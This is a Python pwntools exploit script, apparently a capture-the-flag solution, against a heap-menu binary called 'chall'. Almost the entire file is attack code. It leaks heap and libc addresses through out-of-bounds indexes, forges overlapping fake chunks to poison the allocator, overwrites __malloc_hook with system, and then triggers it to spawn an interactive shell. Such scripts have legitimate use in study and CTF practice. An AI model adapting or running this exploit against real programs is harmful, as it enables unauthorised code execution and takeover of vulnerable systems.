from pwn import *


def debug(func):
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def get_numbers(vals):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'%d' % len(vals))
    for v in vals:
        io.sendline(b'%d' % v)


@debug
def print_average(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'%d' % idx)
    io.recvuntil(b'is: ')
    return float(io.recvline().rstrip())


@debug
def delete_numbers(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', b'%d' % idx)


binpath = './chall'
libcpath = './libc.so.6'

elf = ELF(binpath)
libc = elf.libc
# libc = ELF(libcpath)

context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
# after menu
# b *0x55555555555b
# ignore 1 35
set $numbers=0x5555555592a0
set $a=0x5555555552a4
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath, env={'LD_PRELOAD': libcpath})

# fill tcache
zeros = [0 for _ in range(0x60 // 8)]
for i in range(7):
    get_numbers(zeros)
    delete_numbers(0)


get_numbers(zeros[:-1] + [2])  # 0
get_numbers(zeros)  # 1
get_numbers(zeros)  # 2
get_numbers(zeros)  # 3
delete_numbers(2)
delete_numbers(1)
delete_numbers(0)

ave = print_average(624)
addr_heap = int(ave * 2 - 0x71) - 0x16f0
print("addr_heap = 0x{:x}".format(addr_heap))

# create non tcache chunk and free
addr_leak_ctr = addr_heap + 0x1668
get_numbers([0 for _ in range(0x600 // 8)])  # 0
get_numbers([addr_leak_ctr] + zeros[:-5] + [3])  # prevent consolidate
delete_numbers(0)

ave = print_average(625)
addr_libc = int(ave * 3 - 0xf1 - 0x1eabe0)
print(ave)
print("addr_libc = 0x{:x}".format(addr_libc))

# point to fake chunk inside 4
# which will overlap with 5
addr_fake_chunk = addr_heap + 0x1820
fake_chunk = zeros[::]
fake_chunk[0x6] = 0x71

fake_trail_chunk = [1 for _ in range(0x30 // 8)]
fake_trail_chunk += [0x21]
fake_trail_chunk += [2 for _ in range(0x18 // 8)]
fake_trail_chunk += [0x21]

get_numbers(zeros)  # 0 (size == 0x70) uesless chunk
# to prevent consolidation (size == 0x80 because it is using part of unsorted bins)
get_numbers([addr_fake_chunk] + zeros[1:])  # 2 (size == 0x80) uselesschunk
get_numbers(fake_chunk)  # 4
get_numbers(fake_trail_chunk)  # 5
get_numbers(zeros)  # 6

delete_numbers(5)
delete_numbers(651)  # free fake_chunk

overlap_chunk = [3 for _ in range(4)]
overlap_chunk += [0x71]
overlap_chunk += [addr_libc + libc.symbols["__malloc_hook"] - 0x23]
overlap_chunk += [4 for _ in range(0x60 // 8 - len(overlap_chunk))]  # pad
get_numbers(overlap_chunk)

# consume
get_numbers(zeros)

# offsets_one_gadget = [945043, 945046, 945049, 1093545]
# addr_one_gadget = addr_libc + offsets_one_gadget[0]
# print("addr_one_gadget = 0x{:x}".format(addr_one_gadget))
addr_system = addr_libc + libc.symbols["system"]
fake_hook = [0]
fake_hook += [u64(b'\x00' * 3 + p64(addr_system)[:5], sign="signed")]
fake_hook += [u64(p64(addr_system)[5:] + b'\x02' * 5, sign="signed")]
fake_hook += [0 for _ in range(0x60 // 8 - len(fake_hook))]
get_numbers(fake_hook)

# fire __malloc_hook
# make sure that the size will point to "sh\x00"
addr_sh = addr_libc + next((o for o in libc.search(b'sh\00') if o % 8 == 0))
print("addr_sh = 0x{:x}".format(addr_sh))
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'>', b'%d' % (addr_sh // 8 - 1))

io.interactive()
